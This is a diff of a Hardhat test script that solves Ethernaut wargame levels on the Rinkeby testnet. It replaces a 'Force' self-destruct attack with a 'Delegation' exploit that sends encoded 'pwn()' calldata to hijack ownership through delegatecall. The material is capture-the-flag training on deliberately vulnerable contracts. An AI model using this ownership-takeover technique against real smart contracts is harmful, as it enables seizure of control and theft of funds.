@@ -13,25 +13,28 @@ before(async () => {
   accounts = await ethers.getSigners();
   [eoa] = accounts;
   // Update to match the target contract
-  const challengeFactory = await ethers.getContractFactory(`Force`);
+  const challengeFactory = await ethers.getContractFactory(`Delegation`);
+  // The below address comes from Ethernaut deployed on Rinkeby
+  // Go to https://ethernaut.openzeppelin.com/, select a Level, grab address
+  // from the URL
   const challengeAddress = await createChallenge(
-    `0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea`
+    `0x9451961b7Aea1Df57bc20CC68D72f662241b5493`
   );
   challenge = await challengeFactory.attach(challengeAddress);
-
-  const attackerFactory = await ethers.getContractFactory(`ForceAttacker`);
-  attacker = await attackerFactory.deploy(challenge.address);
 });
 
 it("solves the challenge", async function () {
-    // Add ether to the attacking contract
+    // computes the first four bytes of the function signature
+    // so that we can correctly pass it as the value in `data` .
+    const iface = new ethers.utils.Interface(["function pwn()"]);
+    const data = iface.encodeFunctionData("pwn");
+
     tx = await eoa.sendTransaction({
         from: eoa.getAddress(),
-        to: attacker.address,
-        value: ethers.utils.parseUnits(`1`, `wei`),
+        to: challenge.address,
+        data: data,
+        gasLimit: ethers.BigNumber.from(`100000`)
     });
-
-    await attacker.attack(); // triggers self-destruct
 });
 
 after(async () => {
